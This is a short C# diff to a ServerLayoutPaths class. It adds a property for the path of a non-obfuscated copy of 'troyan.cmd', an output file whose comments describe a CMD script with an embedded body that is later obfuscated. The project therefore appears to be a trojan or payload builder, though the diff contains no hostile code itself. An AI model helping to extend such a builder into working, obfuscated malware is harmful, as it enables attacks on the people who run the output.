@@ -46,6 +46,10 @@ public sealed class ServerLayoutPaths
     /// <summary>Plain CMD + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanCmd"/>).</summary>
     [JsonPropertyName("troyanOutputCmd")] public string TroyanOutputCmd => Path.Join(TroyanOutputDir, "troyan.cmd");
 
+    /// <summary>Pre-obfuscation <c>troyan.cmd</c> kept for inspection under <c>_output</c>.</summary>
+    [JsonPropertyName("troyanOutputCmdNonObfuscated")]
+    public string TroyanOutputCmdNonObfuscated => Path.Join(TroyanOutputDir, "troyan.cmd.nonobfuscated");
+
     public string UserDataFile(string file) => _paths.UserDataFile(file);
 
     [JsonPropertyName("userBody")] public string UserBody => _paths.UserDataBody;
